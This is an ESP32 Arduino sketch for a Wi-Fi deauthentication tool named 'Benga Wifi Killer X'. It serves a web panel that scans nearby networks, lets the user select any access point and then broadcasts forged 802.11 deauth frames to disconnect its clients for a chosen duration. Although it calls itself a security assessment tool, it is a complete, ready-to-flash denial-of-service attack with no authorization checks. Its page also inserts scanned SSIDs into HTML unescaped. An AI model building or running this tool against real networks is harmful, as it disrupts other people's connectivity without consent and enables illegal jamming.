#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <Adafruit_NeoPixel.h>

#define RGB_PIN 48
#define NUMPIXELS 1
Adafruit_NeoPixel pixels(NUMPIXELS, RGB_PIN, NEO_GRB + NEO_KHZ800);

WebServer server(80);
const char* ap_ssid = "BengaWifiX";
const char* ap_password = "12345678";

// Broadcast MAC address
const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// WiFi scanning and attack variables
bool attack_active = false;
bool schedule_channel_change = false;
uint8_t target_bssid[6];
unsigned long attack_start_time = 0;
int attack_duration = 10;  // seconds
int target_channel = 1;
String attack_log = "";
int original_channel = 1;

// ---------------- LED Helper ----------------
void setLED(uint8_t r, uint8_t g, uint8_t b) {
  pixels.setPixelColor(0, pixels.Color(r, g, b));
  pixels.show();
}

void setup() {
  Serial.begin(115200);

  // Init LED
  pixels.begin();
  setLED(0, 0, 255); // Blue = idle

  // Start AP mode on channel 1
  WiFi.softAP(ap_ssid, ap_password, original_channel);
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);

  // Set up server endpoints
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/start", handleStartAttack);
  server.on("/stop", handleStopAttack);
  server.on("/status", handleStatus); // Status endpoint

  server.begin();
}

void loop() {
  server.handleClient();

  // Handle scheduled channel change
  if (schedule_channel_change) {
    schedule_channel_change = false;
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
  }

  // Handle active attack
  if (attack_active) {
    if (millis() - attack_start_time < (attack_duration * 1000)) {
      sendDeauthPacket(target_bssid, broadcast_mac);
      delay(50);  // Increased packet rate
    } else {
      attack_active = false;
      esp_wifi_set_channel(original_channel, WIFI_SECOND_CHAN_NONE);
      setLED(0, 0, 255); // back to blue
      attack_log = "Attack finished";
    }
  }
}

void handleRoot() {
  String html = R"=====(
<!DOCTYPE html>
<html>
<head>
  <title>Benga Wifi Killer X</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; }
    table { border-collapse: collapse; width: 100%; }
    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
    th { background-color: #f2f2f2; }
    button { margin: 5px; padding: 8px 16px; }
    .container { max-width: 800px; margin: 0 auto; }
    #status-bar { margin-top:15px;padding:10px;background:#eee;border-radius:5px; }
    #warning { display: none; background: #fff8e1; border-left: 4px solid #ffc107; padding: 10px; margin: 15px 0; }
  </style>
</head>
<body>
<div class="container">
  <header style="text-align: center; margin-bottom: 30px;">
    <h1 style="margin-bottom: 5px;">Benga Wifi Killer X</h1>
    <p style="color: #666;">Network Security Assessment Tool</p>
  </header>
  
  <div id="warning">
    <strong>Note:</strong> You will temporarily disconnect during attacks. 
    Reconnection happens automatically when the attack completes.
  </div>
  
  <section style="background-color: #f9f9f9; padding: 20px; border-radius: 8px; margin-bottom: 30px;">
    <h2 style="margin-top: 0;">Network Scanner</h2>
    <button onclick="scanNetworks()" style="background-color: #4CAF50; color: white;">Scan Networks</button>
    <div id="networks" style="margin-top: 20px;"></div>
  </section>
  
  <section id="attack-control" style="display:none; background-color: #fff7f7; padding: 20px; border-radius: 8px; border-left: 4px solid #ff5252;">
    <h2 style="margin-top: 0; color: #d32f2f;">Attack Control</h2>
    
    <div style="display: grid; grid-template-columns: auto 1fr; gap: 12px; margin-bottom: 20px;">
      <strong>Target:</strong>
      <span id="target-ssid" style="font-weight: bold; color: #d32f2f;"></span>
      
      <strong>Duration:</strong>
      <div>
        <input type="number" id="duration" value="10" min="1" max="60" style="padding: 8px; width: 80px;">
        <span>seconds</span>
      </div>
    </div>
    
    <div style="display: flex; gap: 10px;">
      <button onclick="startAttack()" style="background-color: #d32f2f; color: white; flex: 1;">Start Attack</button>
      <button onclick="stopAttack()" style="background-color: #333; color: white; flex: 1;">Stop Attack</button>
    </div>
    
    <div id="attack-status" style="margin-top: 15px; padding: 10px; background-color: #ffeaea; display: none;"></div>
  </section>

  <div id="status-bar">Status: Idle</div>
</div>

<script>
function scanNetworks() {
  document.getElementById('networks').innerHTML = '<p style="color: #666; font-style: italic;">Scanning networks...</p>';
  
  fetch('/scan')
    .then(response => response.json())
    .then(data => {
      if (data.length === 0) {
        document.getElementById('networks').innerHTML = '<p>No networks found</p>';
        return;
      }
      
      let table = `<table>
        <thead>
          <tr>
            <th>SSID</th>
            <th>BSSID</th>
            <th>Channel</th>
            <th>Signal</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>`;
      
      data.forEach(network => {
        table += `<tr>
          <td><strong>${network.ssid}</strong></td>
          <td><code>${network.bssid}</code></td>
          <td>${network.channel}</td>
          <td>${network.rssi} dBm</td>
          <td><button onclick="selectTarget('${network.bssid}', '${network.ssid}', ${network.channel})" style="background-color: #2196F3; color: white;">Select</button></td>
        </tr>`;
      });
      
      table += '</tbody></table>';
      document.getElementById('networks').innerHTML = table;
    });
}

function selectTarget(bssid, ssid, channel) {
  document.getElementById('target-ssid').textContent = ssid;
  window.selectedBSSID = bssid;
  window.selectedChannel = channel;
  document.getElementById('attack-control').style.display = 'block';
  document.getElementById('attack-status').style.display = 'none';
}

function startAttack() {
  const duration = document.getElementById('duration').value;
  const statusEl = document.getElementById('attack-status');
  const warningEl = document.getElementById('warning');
  
  warningEl.style.display = 'block';
  statusEl.style.display = 'block';
  statusEl.innerHTML = `<span style="color: #d32f2f;">Attacking ${document.getElementById('target-ssid').textContent} for ${duration} seconds...</span>`;
  
  fetch(`/start?bssid=${encodeURIComponent(window.selectedBSSID)}&channel=${window.selectedChannel}&duration=${duration}`)
    .then(() => {
      statusEl.innerHTML = `<span style="color: #388E3C;">Attack started successfully!</span>`;
    })
    .catch(() => {
      statusEl.innerHTML = `<span style="color: #d32f2f;">Error starting attack!</span>`;
    });
}

function stopAttack() {
  const statusEl = document.getElementById('attack-status');
  
  statusEl.style.display = 'block';
  statusEl.innerHTML = `<span>Stopping attack...</span>`;
  
  fetch('/stop')
    .then(() => {
      statusEl.innerHTML = `<span style="color: #388E3C;">Attack stopped successfully!</span>`;
    })
    .catch(() => {
      statusEl.innerHTML = `<span style="color: #d32f2f;">Error stopping attack!</span>`;
    });
}

// Live status updater with countdown
setInterval(() => {
  fetch('/status')
    .then(res => res.json())
    .then(data => {
      document.getElementById('status-bar').innerText = "Status: " + data.status;
    });
}, 1000);
</script>
</body>
</html>
)=====";

  server.send(200, "text/html", html);
}

void handleScan() {
  setLED(255, 255, 0); // Yellow = scanning
  String json = "[";
  int numNetworks = WiFi.scanNetworks();
  
  for (int i = 0; i < numNetworks; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"rssi\":" + String(WiFi.RSSI(i));
    json += "}";
  }
  json += "]";
  
  server.send(200, "application/json", json);
  WiFi.scanDelete();
  setLED(0, 0, 255); // back to blue after scan
}

void handleStartAttack() {
  if (server.hasArg("bssid")) {
    String bssidStr = server.arg("bssid");
    if (server.hasArg("duration")) {
      attack_duration = server.arg("duration").toInt();
    }
    if (server.hasArg("channel")) {
      target_channel = server.arg("channel").toInt();
    }
    
    sscanf(bssidStr.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
           &target_bssid[0], &target_bssid[1], &target_bssid[2],
           &target_bssid[3], &target_bssid[4], &target_bssid[5]);
    
    attack_active = true;
    attack_start_time = millis();
    schedule_channel_change = true;  // Defer channel change
    
    setLED(255, 0, 0); // Red = attacking
    attack_log = "Attack started on " + bssidStr;
    server.send(200, "text/plain", "Attack started");
  } else {
    server.send(400, "text/plain", "Missing BSSID parameter");
  }
}

void handleStopAttack() {
  attack_active = false;
  esp_wifi_set_channel(original_channel, WIFI_SECOND_CHAN_NONE);  // Revert channel
  setLED(0, 0, 255); // back to blue
  attack_log = "Attack stopped manually";
  server.send(200, "text/plain", "Attack stopped");
}

void handleStatus() {
  String status;
  if (attack_active) {
    int elapsed = (millis() - attack_start_time) / 1000;
    int remaining = attack_duration - elapsed;
    if (remaining < 0) remaining = 0;
    status = "Attacking... " + String(remaining) + "s remaining";
  } else {
    status = "Idle";
  }
  server.send(200, "application/json", "{\"status\":\"" + status + "\",\"log\":\"" + attack_log + "\"}");
}

void sendDeauthPacket(const uint8_t* bssid, const uint8_t* sta) {
  uint8_t packet[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
  };

  memcpy(packet + 4, sta, 6);
  memcpy(packet + 10, bssid, 6);
  memcpy(packet + 16, bssid, 6);

  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}
